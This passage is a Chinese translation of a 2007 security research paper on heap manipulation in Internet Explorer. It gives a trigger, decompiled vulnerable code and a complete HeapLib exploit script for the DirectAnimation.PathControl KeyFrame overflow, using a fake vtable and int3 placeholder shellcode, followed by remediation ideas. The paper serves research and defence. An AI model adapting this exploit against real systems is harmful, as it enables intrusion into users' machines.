+x1,y1, ..., xN,yN<br/>
+沿着路径标识点的x和y坐标集<br/>
+time2, ..., timeN<br/>
+该路径从前一点到达每个相应点所需的时间<br/>
+KeyFrameArray<br/>
+包含x和y坐标定义的数组<br/>
+TimeFramArray<br/>
+包含定义路径的点之间的时间值的数组，从x1和y1点开始，通过xN和yN点（路径中的最后一组点）。路径从点x1和y1开始，时间值为0。</p>
+<p>以下JavaScript代码将触发此漏洞：</p>
+<pre><code>var target = new ActiveXObject("*DirectAnimation.PathControl");
+target.KeyFrame(0x7ffffff,new Array(1）， new Array(1));</code></pre>
+<h2 data-content="1" id="380d21777db5ea8f249a26b78e05a708">Vulnerable code</h2>
+<p>该漏洞位于DAXCTLE.OCX的CPathCtl :: KeyFrame函数中。 该函数的反编译代码如下所示：</p>
+<pre><code>long_stdcall CPathCtl::KeyFrame(unsigned int npoints,struct tagVARIANT KeyFrameArray,
+                                                      struct tagVARIANT TimeFrameArray)
+{
+    int err = 0;
+    ...
+    //new运算符是CMemManager :: AllocBuffer的一个包装。如果分配大小小于0x2000，它将从一个特殊的CMemManager堆中分配一个块，否则它等同于：   
+    //HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,size+8) + 8
+    buf_1      = new((npoints*2)*8);
+    buf_2      = new((npoints*2)*8);
+    KeyFrameArray.filed_C = new(npoints*4);
+    TimeFrameArray.filed_C = new(npoints*4);
+
+    if(buf_1 == NULL || buf_2 == NULL  || KeyFrameArray.field_C == NULL ||
+                                                    TimeFrameArray.filed_C == NULL)
+    {
+        err = E_OUTOFMEMORY;
+        goto cleanup;
+    }
+    //如果KeyFramArray数组小于npoints * 2或者TimeFrame数组小于npoints-1，我们设置一个错误并转到cleanup代码      
+    if(KeyFrameArrayAccessor.ToDoubleArray(npoints*2, buf_1) &lt; 0 ||
+        TimeFrameArrayAccessor.ToDoubleArray(npoints-1, buf_2) &lt; 0)
+    {
+        err = E_FALL;
+        goto cleanup;
+    }
+    ...
+cleanup:
+    if(npoints &gt; 0)
+        for(i = 0; i &lt; npoints; i++)
+        {
+
+//我们从0迭代到npoints，并在KeyFrameArray-&gt; field_C和TimeFrameArray-&gt; field_C的所有非NULL元素上调用虚函数
+            if(KeyFrameArray.field_C[i] != NULL)
+                KeyFrameArray.field_C[i] -&gt; func_8();
+            if(TimeFrameArray.filed_C[i] != NULL)
+                TimeFrameArray.field_C -&gt; func_8();
+        }
+     ...
+     return err;
+}</code></pre>
+<p>KeyFrame函数将npoints参数乘以16,8和4，并分配四个缓冲区。如果npoints大于0x40000000，则分配大小将wrap up，函数将分配四个小缓冲区。在我们的EXP中，我们将npoint设置为0x40000801，函数将分配大小为0x8018,0x4008的缓冲区和两个大小为0x200c的缓冲区。我们希望最小的缓冲区大于0x2000字节，因为小于0x2000的缓冲区分配将来自CMemManager堆而不是系统分配器。</p>
+<p>在分配缓冲区之后，函数调用CSafeArrayOfDoublesAccessor :: ToDoubleArray（）来初始化数组访问器对象。如果KeyFrameArray的大小小于npoints，ToDoubleArray将返回E_INAVLIDARG。在这种情况下执行的cleanup将遍历两个0x2004字节缓冲区，并在缓冲区中的每个非NULL元素上调用虚函数。</p>
+<p>这些缓冲区被分配了HEAP_ZERO_MEMORY标志，并且只包含指针。然而，代码将从0到npoint（即0x40000801）进行迭代，并且最终将访问超过0x200c字节缓冲区末尾的数据。 如果我们控制KeyFrameArray.field_C缓冲区后面的第一个dword，我们就可以使它指向一个指向虚表中的一个指向shellcode的指针。调用func_8（）的虚函数将会执行我们的shellcode。</p>
+<h2 data-content="1" id="63a57906f6f882962f7aa89b8c1d6d8b">Exploit</h2>
+<p>要利用这个漏洞，我们需要控制0x200c字节缓冲区之后的四个bytes。首先，我们将用大小为0x2010的块对堆进行碎片整理（内存分配器分配的内存对齐为8，所以0x200c取整为0x2010 ）。然后我们将再分配两个0x2020字节的内存块，在偏移0x200c处写入假对象指针，并将它们释放到空闲列表中。</p>
+<p>当KeyFrame函数分配两个0x200c字节的缓冲区时，内存分配器将重用我们大小为0x2020字节的块，清零第一个0x200c字节。KeyFrame函数末尾的cleanup循环将到0x200c偏移处的假对象指针，并将通过其虚表调用一个函数。列表中唯一的条目是我们的虚表。</p>
+<p>调用虚函数的代码是：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306121830-6d59ab74-20f5-1.png"/><br/>
+虚拟调用是通过ecx + 8，它将转移到执行IEXPLORE.EXE中的jump ecx指令。指令跳回到vtable的开始处并且执行shellcode。有关vtable的更多详细信息，请参阅上一个部分。</p>
+<p>完整的漏洞利用代码如下所示:</p>
+<pre><code>//创建ActiveX 对象
+var target = new ActiveXObject("DirectAnimation.PathControl");
+//初始化HeapLib
+var heap = new heapLib.ie();
+//shellocde int 3
+var shellcode = unescape("%uCCCC");
+//IEXPLORE.EXE中jump ecx的地址
+var jmpecx = 0x4058b5;
+//用指向shellcode的指针构建一个伪造的虚表
+var vtable = heap.vtable(shellcode, jmpecx);
+//获得指向vtable的lookaside地址
+var fakeObjectPtr = heap.lookasideAddr(vtable);
+//使用伪造的对象地址构建堆块
+
+//len       padding             fake obj pointer    padding null
+//4 bytes      0x200C - 4 bytes     4bytes          14 bytes  2bytes
+var fakeObjectChunk = heap.padding((0x200c - 4)/2) + heap.addr(fakeObjectPtr) + heap.padding(14/2);
+
+heap.gc();
+heap.debugHeap(true);
+
+//清空lookaside
+heap.debug("Emptying the lookaside")
+for(var i = 0; i&lt;100; i++)
+    heap.alloc(vtable);   
+//把虚表放入lookaside
+heap.debug("Putting the vtable on the lookaside")
+heap.lookaside(vtable);
+//对堆进行碎片整理
+heap.debug(“Defragmenting the heap with blocks of size 0x2010”)
+For(var i = 0; i&lt; 100; i++)
+Heap.alloc(0x2010)
+添加具有假对象指针的块到空闲列表
+heap.debug("Creating two holes of size 0x2020");
+heap.freeList(fakeObjChunk,2);
+//触发漏洞            
+target.KeyFrame(0x40000801, new Array(1), new Array(1));
+//cleanup             
+heap.debugHeap(false);</code></pre>
+<h1 data-content="1" id="f5e6fc696818ce44cd87be13e89c6ca0">Remediation</h1>
+<p>本文的这一部分将简要介绍一些保护浏览器免受上述利用技术的思路。</p>
+<h2 data-content="1" id="b5e47c48013687c94204e7aca5f354a0">Heap isolation</h2>
+<p>一个最明显但是不完全有效的保护浏览器的办法就是使用一个专门的堆来存储JavaScript字符串。这个办法只需在OLEAUT32内存分配器中进行一个非常简单的更改，这样会使字符串分配技术完全无效。这样的做法虽然攻击者仍然可以操纵字符串堆的布局，但是不会直接控制MSHTML和ActiveX对象所使用的堆。</p>
+<p>如果在未来的Windows版本会实现这个保护机制。我们期望研究出通过调用特定的ActiveX方法或者DHTML操作来实现对MSHTML和ActiveX堆的控制的办法。</p>
+<p>就安全架构而言，应该将堆布局视为第一类可利用对象，类似于堆栈或堆数据。作为一般的设计原则，不可信任的代码不应给予直接访问由应用程序所使用的堆的权限。</p>
+<h2 data-content="1" id="fca503f0d71b2799ffef4e630498cea2">Non-determinism</h2>
+<p>使内存分配器的分配具有不确定性，是防止堆漏洞利用的一种好方法。如果攻击者无法预测特定堆的分配将在何处发生，那么改变堆状态将变得更加困难。 虽然这个思路不是一个新的想法，但据我们所知，它还没有在任何主流的操作系统上实现。</p>
+<h1 data-content="1" id="d2e79dbe2952398ab759f3394962bee2">Conclusion</h1>
+<p>本文提出的堆操作技术依赖于Internet Explorer中可以通过执行不可信的JavaSript代码，在系统堆上执行任意分配和释放。这种方法对堆的控制程度已经被证明可以明显提高堆漏洞的利用效果，即使是堆最困难的堆漏洞的利用也是如此.</p>
+<p>对此进一步研究的两个思路是对Windows Vista的开发，并将相同的技术应用于Firefox，Opera和Safri。我们相信从脚本语言操纵堆的思路也适用于许多其他允许不可信脚本执行的系统.</p>
+<p>原文链接：<br/>
+<a href="https://www.blackhat.com/presentations/bh-usa-07/Sotirov/Whitepaper/bh-usa-07-sotirov-WP.pdf" target="_blank">https://www.blackhat.com/presentations/bh-usa-07/Sotirov/Whitepaper/bh-usa-07-sotirov-WP.pdf</a></p>
+</div>
+</div>
